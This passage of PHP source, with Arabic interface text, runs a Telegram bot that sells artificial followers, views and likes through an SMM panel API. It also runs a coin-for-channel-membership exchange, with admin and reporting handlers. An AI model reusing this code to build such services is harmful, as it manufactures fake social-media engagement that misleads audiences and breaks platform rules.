     [['text'=>'تحديث' ,'callback_data'=>"updates|".$text]],
     [['text'=>'رجوع' ,'callback_data'=>"tobot"]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
} else {
	bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
️هذا الطلب ليس موجود في طلباتك ❌
  ", 
 'parse_mode'=>"markdown",
]);
	} 
}
}


$s3rtmoil = $rshq["s3rtmoil"]?? "12";

if($data == "tmoile") {
 	

    $key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "tobot"]];
$cbn = $coin / 8;
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
كل 1 عضو 👤 مقابل $s3rtmoil نقطة 
👤] ارسل الكمية :
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$modes['mode'][$from_id]  = $data ;
   
SETJSON($rshq); SETJSON12($modes);
} 


$data_ = explode("|", $data) ;
$helper = USR_BOT ;
$idna = $tmoil["tmoils"]??"10";
if(is_numeric($text) and $modes['mode'][$from_id] == "tmoile" ){
	$data_[1] = $text ;
	if($data_[1] < $idna){
		bot('sendmessage',[
      'chat_id' => $chat_id, 
      'text'=>"
اقل حد للطلب هو $idna ❌
",
      
      ]);
      
			exit ;
		}
	$PrIce = $data_[1] * $s3rtmoil;
	if($coin >= $PrIce) {
	bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- ارفع البوت المساعد 🛠️ [@". $helper." ]
📣] ارسل معرف القناة :



",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$tmoil['sets'][$from_id]["count"] = $data_[1];
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] = "P1";
$modes['mode'][$from_id]  = null ;
   
SETJSON($rshq); SETJSON12($modes);
SETJSON1($tmoil);
} else {
	$g = $PrIce - $coin;
	bot('sendmessage',[
      'chat_id' => $chat_id, 
      'text'=>"
".$name3mla."ك لاتكفي ❌
▶️ متبقي $g
",
      'show_alert'=>true
      ]);
	} 
	}
	
	$coins = $coin;
	if(preg_match("/@/",$text) and $tmoil["sets"][$from_id]["to"] == "P1") {
		$text = str_replace ("@",null, $text) ;
		if(in_array($text, $tmoil["blocks"])) {
			bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
⚠️ عذرا ولكن القناة تم حظرها من التمويل
🎟️] معرفها : [@$bv]
  ", 
  'parse_mode'=>"markdown",

]);
unset($tmoil["sets"][$from_id]);
SETJSON1($tmoil);
return false ;
			} 
		$getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => "@$text" , 'user_id' => IDBot]));
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] == "administrator") {
				$kmia=$tmoil['sets'][$from_id]["count"];
				$coi=$tmoil["sets"][$from_id]["price"];
				$idM = rand(999999,9999999999);
				bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
📜] معلومات الطلب :

📣) معرف القناة : [@$text] 
👥) الكمية : $kmia
??) السعر : $coi
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"تأكيد الطلب ✅",'callback_data'=>"ADDMOL|$idM" ]], 
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]], 
       
      ]
    ])
]);
$tmoil['info']["$idM"] = "$text|$kmia|$coi" ;
$tmoil['chanels']["id_$text"] = $idM;
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] = "P2";
SETJSON1($tmoil);
				} else {
					bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
- ارفع البوت المساعد 🛠️ [@". $helper." ]
📣] ارسل معرف القناة :


  ", 
  'parse_mode'=>"markdown",
]);

					} 
		
		} 
	if($data_[0] == "getv") {
				$chs = $data_[1];
				$bv = $chs;
				$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
			$nt = json_decode($mt, true);
			$bv = $chs ;
			if ($nt['result']['status'] == "administrator") {
				$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] != "left" ) {
				$coinIshtrak = $coinIshtrak??"10";
				bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
تم اضافه $coinIshtrak $name3mla الي حسابك ✅
",
      'show_alert'=>true
      ]);
				$rshq["coin"][$from_id] += $coinIshtrak??"10";
				SETJSON($rshq); SETJSON12($modes); 
$idM = $tmoil['chanels']["id_$bv"] ;
$ci =$tmoil['db']["$idM"]["count"] ;
$vx = $ci - $tmoil['db']["$idM"]["startc"] ;
$vx = $vx - 1;
bot('sendMessage',[
   'chat_id'=>$tmoil['db']["$idM"]["owner"] ,
   'text'=>"
👤اشترك شخص جديد في قناتك✅ [@$bv]
📝العدد المطلوب : $ci
🔢العدد المتبقي لتمويلك : $vx
⚠️) لا تقم بتنزيل البوت [@".USR_BOT."] 
من الادمنية حتى لا يتم الغاء طلبك 🚫
  ",
  'disable_web_page_preview' => true, 
  'parse_mode'=>"markdown",
]);
if($vx == 0){
	bot('sendMessage',[
   'chat_id'=>$tmoil['db']["$idM"]["owner"] ,
   'text'=>"
تم الانتهاء من تمويل قناتك ✅

📣) معرف القناة : [@$bv]
🔢) العدد المطلوب : $ci
  ", 
  'parse_mode'=>"markdown",
]);
$st=$bv;
$st=array_search($st,$tmoil['db']["chs"]);
unset($tmoil['db']["chs"][$st]);

$tmoil['db']["complete"][] =$bv;
$F = "tmoil/". USR_BOT."/tmoil.json";
        $N = json_encode($tmoil, JSON_PRETTY_PRINT);
        
        file_put_contents($F, $N);

	}

$tmoil['botCom'] +=1;
$tmoil['db']["$idM"]["startc"] +=1;
		$tmoil["coin"][$from_id] += $coinIshtrak??"10";
		
		$coinb = $tmoil["coin"][$from_id] + $coinIshtrak?? "10";
		$tmoil["chids"][$from_id][] = $idM;
		$tmoil["mechs"][$from_id] += 1;
		
		SETJSON1($tmoil); 
		
				}
				
				foreach ($tmoil['db']["chs"] as $chs) {
					
					$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
			$nt = json_decode($mt, true);
			$bv = $chs ;
			if ($nt['result']['status'] == "administrator") {
				$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] == "left" ) {
				$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$bv"))->result;
$getN = $getch2->title;
if($getN == null) { $getN = "@$bv";}
				bot('editMessagetext',[
					
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
🍪] ".$name3mla."ك : $coin 👤
اشترك في القناة [@$bv] 

  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$getN",'url'=>"https://t.me/$bv" ]], 
     [['text'=>"اشتركت ✅",'callback_data'=>"getv|$bv" ], ['text'=>"تخطي ⚠️",'callback_data'=>"skip|$bv" ]], 
     [['text'=>"ارسـال ابـلاغ ⚠️",'callback_data'=>"sendblock|$bv" ], ['text'=>"$NamesBACK",'callback_data'=>"tobot" ]], 
       
      ]
    ])
]);
				exit ;
				}
				}
				} 
			
				if($bv == null or $getN == null ) {
					bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
⛔ انتهت قنوات التمويل قم بتجميع ال$name3mla عن طريق رابط الدعوه
",
      'show_alert'=>true
      ]);
      bot('editMessagetext',[
   'chat_id'=>$chat_id,
   'message_id' => $message_id, 
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
exit;
					}
					} 
	} 
	if($data_[0] == "ADDMOL") {
		$h= $data_[1];
		$vZ = explode("|", $tmoil['info']["$h"]);
		$text = str_replace ("@",null, $vZ[0]) ;
		if(in_array($text,$tmoil['db']["chs"])) {
			bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
🔶 هذا القناة قيد التمويل بالفعل
",
      'show_alert'=>true
      ]);
      bot('editMessagetext',[
   'chat_id'=>$chat_id,
   'message_id' => $message_id, 
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
			exit ;
			} 
		$getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => "@$text" , 'user_id' => IDBot]));
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] == "administrator") {
				$kmia=$vZ[1];
				$coi=$vZ[2];
				$idM = $data_[1];
				if($coins >= $coi) {
					$rshq["coin"][$from_id] -= $coi;
					SETJSON($rshq); SETJSON12($modes);
					$date = date("d|m|y:H:i:s");
				bot('editMessagetext',[
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
📜] تم انشاء طلب بنجاح ✅ :

📣) معرف القناة : [@$text]
👥) الكمية : $kmia
🍪) السعر : $coi 
⏳] التاريخ : $date

⚠️) لا تقم بتنزيل المساعد [@". bot("getme")->result->username. "] 
من الادمنية حتى لا يتم الغاء طلبك 🤍
  ", 
  'parse_mode'=>"markdown",
]);

$tmoil['coin'][$from_id] -= $coi;

$tmoil['chanels']["id_$text"] = $idM;
$tmoil['db']["$idM"]["count"] = $kmia;
$tmoil['db']["chs"][] = $text ;
$tmoil['db']["chsme"][$from_id][] = $text ;
$tmoil['db']["$idM"]["price"] = $coi;
$tmoil['db']["$idM"]["owner"] = $from_id ;
$tmoil['db']["$idM"]["create"] = $date ;
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] =null ;
SETJSON1($tmoil);

$coin = $coin - $coi;
$getChatMemberReq = file_get_contents("https://api.telegram.org/bot" . $API_KEY . "/getChatMember?chat_id=" . $forwardFromChat['id'] . "&user_id=" . IDBot);
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			$al3dd = json_decode(file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMemberscount?chat_id=@" . $text))->result;
			$ch2 = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@$text&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$text"))->result;
$nm = $getch2->title;
$bv = $text ;
if($nm == null) { $nm = "@$bv";}
$lnk = "https://t.me/$bv" ;

$mes=array("$admin", "5561152568") ;
foreach($mes as $v) {
bot('sendMessage',[
   'chat_id'=>$v ,
   'text'=>"
- بدء تمويل قناة [$nm]($lnk) بـ $kmia عضو🚸
• العدد قبل التمويل : $al3dd
  ", 
  'parse_mode'=>"markdown",
 'disable_web_page_preview' => true, 
]);
} 
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
} else {
	bot('sendmessage',[
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
⁉️] ".$name3mla."ك لاتكفي، 

  ", 
  'parse_mode'=>"markdown",
]);
bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
	} 
				} else {
					bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
- ارفع البوت المساعد 🛠️ [@". $helper." ]
📣] ارسل معرف القناة :


  ", 
  'parse_mode'=>"markdown",
]);
					} 
		
		}
		//الملف كتابه بيرو  @v44vv - @Sero_Bots

		if($data == "addtmoil") {
			if($chat_id == $sudo or $chat_id==5561152568 or in_array($from_id, $Js['admin'])  ) {
				bot('editMessagetext',[
					
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
- اهلا بك عزيزي الادمن 👤
- ارسل العدد التمويل لاضتفه القناة للتمويل ✅

  ", 
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text' => 'رجوع', 'callback_data' => "rshqG"]],
       
      ]
    ])
]);
$modes['mode'][$from_id] = "admntmoil" ;
      SETJSON($rshq) ;
      
				}
				} 

$data_ = explode("|", $data) ;
$helper = USR_BOT ;
$idna = $tmoil["tmoils"]??"10";
if($text and $modes['mode'][$from_id] == "admntmoil" ){
	$data_[1] = $text ;
	
	if(true) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- ارفع البوت المساعد 🛠️ [@". $helper." ]
📣] ارسل معرف القناة :



عزيزي الادمن 👤

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]],
       
      ]
    ])
]);
$tmoil['sets'][$from_id]["count"] = $data_[1];
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] = "PS1";
$modes['mode'][$from_id]  = null ;
   
SETJSON($rshq); SETJSON12($modes);
SETJSON1($tmoil);
} 
	}
	
	$coins = $coin;
	if($text and $tmoil["sets"][$from_id]["to"] == "PS1") {
		$text = str_replace ("@",null, $text) ;
		$getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => "@$text" , 'user_id' => IDBot]));
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] == "administrator") {
				$kmia=$tmoil['sets'][$from_id]["count"];
				$coi=$tmoil["sets"][$from_id]["price"];
				$idM = rand(999999,9999999999);
				bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
📜] معلومات الطلب عزيزي الادمن :

📣) معرف القناة : [@$text] 
👥) الكمية : $kmia

  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"تأكيد الطلب ✅",'callback_data'=>"ADDMOL|$idM" ]], 
     [['text'=>"$NamesBACK",'callback_data'=>"tobot" ]], 
       
      ]
    ])
]);
$tmoil['info']["$idM"] = "$text|$kmia|$coi" ;
$tmoil['chanels']["id_$text"] = $idM;
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] = "P2";
SETJSON1($tmoil);
				} else {
					bot('sendMessage',[
   'chat_id'=>$chat_id ,
   'text'=>"
- ارفع البوت المساعد 🛠️ [@". $helper." ]
📣] ارسل معرف القناة :



عزيزي الادمن 👤
  ", 
  'parse_mode'=>"markdown",
]);

					} 
		
		}
		
		
		if($data_[0] == "sendblock") {
					if(!in_array($data_[1],$tmoil['blockers']["$from_id"])){
						$bv = $data_[1];
					bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
⛔] تم ارسال الابلاغ شكرا علي تعاونك معنا
",
      'show_alert'=>true
      ]);
					bot('sendMessage',[
   'chat_id'=>$sudo ,
   'text'=>"
🍪] ابلاغ جديد عزيزي المطور

🔛] من [$name](tg://user?id=$chat_id) 
👤] معرفه : [@$user] 
🔔] الي القناة : [@$bv] 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"@$bv",'url'=>"https://t.me/$data_[1]" ]], 
     [['text'=>"ازاله من التمويل 🌀",'callback_data'=>"delete|$bv" ]], 
       
      ]
    ])
]);
$tmoil['blockers']["$from_id"][] = $data_[1];
SETJSON1($tmoil); 
}else{
	bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
📛] القناة مبلغ عليها من قبلك بلفعل
",
      'show_alert'=>true
      ]);
	} 
					}
					
					if($data_[0] == "delete") {
	$f="@".$data_[1];
	$bv = str_replace("@",null, $f) ;
						bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- هل انت متاكد من ازاله القناة? ⚠️

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"نعم",'callback_data'=>"deletere|$bv" ]],
       [['text'=>"نعم + حظر القناة",'callback_data'=>"deletereblock|$bv" ]],
       [['text'=>"لا",'callback_data'=>"deysx|$bv" ]],
      ]
    ])
]);
						}
						
						if($data_[0] == "deysx") {
							$bv = $data_[1];
							bot('editMessagetext',[
   'chat_id'=>$sudo ,
   "message_id" => $message_id, 
   'text'=>"
🍪] قائمه الابلاغ

🔔] الي القناة : [@$bv] 
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"@$bv",'url'=>"https://t.me/$data_[1]" ]], 
     [['text'=>"ازاله من التمويل 🌀",'callback_data'=>"delete|$bv" ]], 
       
      ]
    ])
]);
							} 
						
					if($data_[0] == "deletere") {
	$f="@".$data_[1];
	$bv = str_replace("@",null, $f) ;
						bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
📊] تم ازاله القناة [$f] من التمويل 
",
      'show_alert'=>true
      ]);
      $bv = $data_[1];
      $st=array_search($bv,$tmoil['db']["chs"]);
$tmoil['db']["chs"]=array_values($tmoil['db']["chs"]);
unset($tmoil['db']["chs"][$st]);
SETJSON1($tmoil); 
						}
						
						if($data_[0] == "deletereblock") {
	$f="@".$data_[1];
	$bv = str_replace("@",null, $f) ;
						bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
📊] تم ازاله القناة [$f] من التمويل  وتم حظرها من التمويل 
",
      'show_alert'=>true
      ]);
      $bv = $data_[1];
      $st=array_search($bv,$tmoil['db']["chs"]);
$tmoil['db']["chs"]=array_values($tmoil['db']["chs"]);
unset($tmoil['db']["chs"][$st]);
$tmoil["blocks"][] = $bv;
SETJSON1($tmoil); 
						}
					
if($data_[0] == "joins") {
			if($data_[1] == "1"){
				
				
				foreach ($tmoil['db']["chs"] as $chs) {
					$idM = $tmoil['chanels']["id_$chs"] ;
					if(!in_array($idM, $tmoil["chids"][$from_id])) {
					$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
			$nt = json_decode($mt, true);
			$bv = $chs ;
			if ($nt['result']['status'] == "administrator") {
				$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
			$getChatMemberRes = json_decode($getChatMemberReq, true);
			if ($getChatMemberRes['result']['status'] == "left" ) {
				$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$bv"))->result;
$getN = $getch2->title;
if($getN == null) { $getN = "@$bv";}
				bot('editMessagetext',[
					
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
اشترك فالقناة @$bv
  ", 
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$getN",'url'=>"https://t.me/$bv" ]], 
     [['text'=>"اشتركت ✅",'callback_data'=>"getv|$bv" ], ['text'=>"تخطي ⚠️",'callback_data'=>"skip|$bv" ]], 
     [['text'=>"ارسـال ابـلاغ ⚠️",'callback_data'=>"sendblock|$bv" ], ['text'=>"$NamesBACK",'callback_data'=>"tobot" ]], 
       
      ]
    ])
]);
				exit ;
				} 
				}
				
				}
				
					
					}
					} 
				

if($bv == null or $getN == null ) {
					bot('answerCallbackQuery',[
      'callback_query_id'=>$update->callback_query->id,
      'text'=>"
⛔ انتهت قنوات التمويل قم بتجميع ال$name3mla عن طريق رابط الدعوه
",
      'show_alert'=>true
      ]);
      bot('editMessagetext',[
   'chat_id'=>$chat_id,
   'message_id' => $message_id, 
   'text'=>"
$starts
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode($RBEROO)
]);
					}
					
				}
				
				if($data_[0] == "skip") {
	
	$tmoil["mechs"][$from_id] += 1;
	SETJSON($tmoil); 
	
	$b=count($tmoil['db']["chs"]) - 1;
				
				if($tmoil['db']["chs"] != null){
					$bn = rand(0,$b) ;
$bv = $tmoil['db']["chs"][$bn] ;
					$ch2 = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@$bv&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$bv"))->result;
$getN = $getch2->title;
if($getN == null) { $getN = "@$bv";}
if($tmoil["mechs"][$from_id] <= $b) {
					bot('editMessagetext',[
					
   'chat_id'=>$chat_id ,
   'message_id' => $message_id, 
   'text'=>"
اشترك فالقناة @$bv
  ", 
  'parse_mode'=>"markdown",
  'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"$getN",'url'=>"https://t.me/$bv" ]], 
     [['text'=>"اشتركت ✅",'callback_data'=>"getv|$bv" ], ['text'=>"تخطي ⚠️",'callback_data'=>"skip|$bv" ]], 
     [['text'=>"ارسـال ابـلاغ ⚠️",'callback_data'=>"sendblock|$bv" ], ['text'=>"$NamesBACK",'callback_data'=>"tobot" ]], 
       
      ]
    ])
]);
}
} 
} 
if($e[0] == "updates"){
	$req = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=status&order=".$e[1]));
$startcc = $req->start_count; 
$status = $req->remains; 
if($status == "0"){
	$sberero= "طلب مكتمل 🟢";
	}else{
		$sberero="قيد الانتضار ....";
		}
		bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
️⃣] معلومات عن الطلب :

- 🔡] اسم الخدمة : ".$rshq["ordn"][$e[1]]."
- 🔢] ايدي الطلب : `$e[1]`
- ♻️] حالة الطلب : $sberero
- ⏳] المتبقي : $status
  ", 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>'تحديث' ,'callback_data'=>"updates|".$e[1]]],
     [['text'=>'رجوع' ,'callback_data'=>"tobot"]],
       
      ]
    ])
]);
	}
if($e[0] == "type"){
	
	if($e[1] == "thbt" or $e[1] == "mthbt" or $e[1] == "hq" ) {
		$typee = "متابعين" ;
		} elseif($e[1] == "view"){
			$typee = "مشاهدات";
			}elseif($e[1] == "like"){
				$typee = "لايكات";
				}
		
		if($e[1] == "thbt") {
			$s3r = 1;
			
			}
			if($e[1] == "mthbt") {
			$s3r = 2;
			}
			if($e[1] == "hq") {
			$s3r = 0.2;
			}
			if($e[1] == "view") {
			$s3r = 25;
			}
			
			if($e[1] == "like") {
			$s3r = 18;
			}
			
			if($rshq["s3rr"][$e[1]] !=null) {
			$s3r = $rshq["s3rr"][$e[1]] ;
			}
        
        $s3r = $rshq['S3RS'][explode("|",$data)[1]][explode("|",$data)[2]];
        $web = ($rshq['Web'][explode("|",$data)[1]][explode("|",$data)[2]]??$rshq["sSite"]) ;
        $s3r = ($s3r ?? "1");
        $key = ($rshq['key'][explode("|",$data)[1]][explode("|",$data)[2]] ?? $rshq["sToken"]);
        $mix = ($rshq['mix'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "1000");
        $min = ($rshq['min'][explode("|",$data)[1]][explode("|",$data)[2]] ?? "100");
        $g= $s3r * 1000;
        $kli = "
        *
       👮🏽] اسم الخدمة : ".$rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]]."
       *

💰] السعر : ". $g ." نقطة لكل 1000

📊] الحد الادني للرشق : $min
🎟️] الحد الاقصي للرشق : $mix

🦾] ارسل الكمية التي تريد طلبها :

 
       ";
      
      $wsfer = $rshq['WSF'][explode("|",$data)[1]][explode("|",$data)[2]]??$kli;
      $tri = $abb = $rshq['wsfer'][explode("|",$data)[1]][explode("|",$data)[2]];
      if($tri == null){
        $tri = $kli;
      }

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
$tri
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"tobot"]],
]])
]);
$rshq['IDX'][$from_id]  =  $rshq['IDSSS'][explode("|",$data)[1]][explode("|",$data)[2]];
$rshq['WSFV'][$from_id]  =  $rshq['klishs'][explode("|",$data)[1]][explode("|",$data)[2]];
$rshq['S3RS'][$from_id]  =  $s3r;
$rshq['web'][$from_id]  =  $web;
$rshq['key'][$from_id]  =  $key;
$rshq['min_mix'][$from_id]  = "$min|$mix" ;
$rshq['SB1'][$from_id]  =  explode("|",$data)[1];
$modes['mode'][$from_id]  =  "SETd";
$rshq['SB2'][$from_id]  =  explode("|",$data)[2];
$rshq["="][$from_id] = $rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]];
SETJSON($rshq); SETJSON12($modes); 
} 

if($e[0] == "kmiat"){
	
	$s3r = $rshq['S3RS'][$from_id];
        $s3r = ($s3r ?? "1");
        $g= $s3r * 1000;

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
👮🏽] اسم الخدمة : [".$rshq['xdmaxs'][explode("|",$data)[1]][explode("|",$data)[2]]."]

💰] السعر : ". $g ." نقطة لكل 1000

🦾] اختر الكمية التي تريد طلبها :
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
  [['text'=>'السعر' ,'callback_data'=>"type|$thbt"], ['text'=>'العدد' ,'callback_data'=>"type|$mthbt"]],
  [['text'=>"$ ".$nm.$s3r*1000,'callback_data'=>"to|1000|$e[1]"], ['text'=>'1000 $' ,'callback_data'=>"to|1000|$e[1]"]],
  [['text'=>"$ ".$nm.$s3r*2000,'callback_data'=>"to|2000|$e[1]"], ['text'=>'2000 $' ,'callback_data'=>"to|2000|$e[1]"]],
  [['text'=>"$ ".$nm.$s3r*4000,'callback_data'=>"to|4000|$e[1]"], ['text'=>'4000 $' ,'callback_data'=>"to|4000|$e[1]"]],
  [['text'=>"$ ".$nm.$s3r*8000,'callback_data'=>"to|8000|$e[1]"], ['text'=>'8000 $' ,'callback_data'=>"to|8000|$e[1]"]],
  [['text'=>"$ ".$nm.$s3r*10000,'callback_data'=>"to|10000|$e[1]"], ['text'=>'10000 $' ,'callback_data'=>"to|10000|$e[1]"]],
  [['text'=>"$ ".$nm.$s3r*20000,'callback_data'=>"to|20000|$e[1]"], ['text'=>'20000 $' ,'callback_data'=>"to|400|$e[1]"]],  
[['text'=>'رجوع' ,'callback_data'=>"type|". $rshq['SB1'][$from_id]."|".$rshq['SB2'][$from_id]]],
]])
]);
} 

if($data  == "tobon"){
  bot("deletemessage",["message_id" => $message_id,"chat_id" => $chat_id,]);
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
 تم الالغاء بنجاح |
   ", 
   'parse_mode'=>"markdown",
 ]);
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
 مرحبا بك في بوت $nambot 👋
 👥] ".$name3mla."ك : *$coin*
 🔢] ايديك : `$from_id`
   ", 
   'parse_mode'=>"markdown",
   'reply_markup'=>json_encode($RBEROO)
 ]);
 $rshq['3dd'][$from_id][$from_id]  = null;
    $modes['mode'][$from_id]  = null;
   
    $rshq["tlbia"][$from_id] = null;
    $rshq["cointlb"][$from_id] += null;
    $rshq["s3rltlb"][$from_id] = null;
    $rshq['tp'][$from_id] = null;
    $rshq['coinn'] = null;
SETJSON($rshq); SETJSON12($modes);
}

if(is_numeric($text) and $modes['mode'][$from_id]  ==  "SETd") {
  $s3r = $rshq['S3RS'][$from_id];
    $e[1] = $text;
    $s3r = $s3r * $text;
    $min = explode("|", $rshq['min_mix'][$from_id])[0];
    $mix = explode("|", $rshq['min_mix'][$from_id])[1];
	if($coin >= $s3r){
		if($rshq['rshqG'] == "on" ) {
			if($text >= $min){
				if($text <= $mix){

$stb = $rshq['WSFV'][$from_id];
if($stb != null){
  $stb = "$stb";
}else{
  $stb = "• ارسل الرابط الخاص بك 📥 :";
}

			bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

$stb

",
'reply_markup'=>json_encode([ 
  'inline_keyboard'=>[
  
  [['text'=>'رجوع + الغاء' ,'callback_data'=>"tobon"]],
  ]])
]);

$rshq['3dd'][$from_id][$from_id]  = $e[1];
    $modes['mode'][$from_id]  = "MJK";
   
    $rshq["tlbia"][$from_id] = $tlbia;
   
    $rshq["s3rltlb"][$from_id] = $s3r;
    $rshq['tp'][$from_id] = $e[2];
    $rshq['coinn'] = $s3r;
SETJSON($rshq); SETJSON12($modes);
return false ;
} else {
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
      • العدد كبير جدا
      • ارسل عدد اصغر او يساوي $mix 😅
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
      
        [['text'=>'رجوع + الغاء' ,'callback_data'=>"tobon"]],
      ]])
      ]);
      return false ;
	} 
  } else {
    bot('sendmessage',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
      • العدد صغير جدا 🤏
      • ارسل عدد اكبر من او يساوي $min 🎟️
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
      
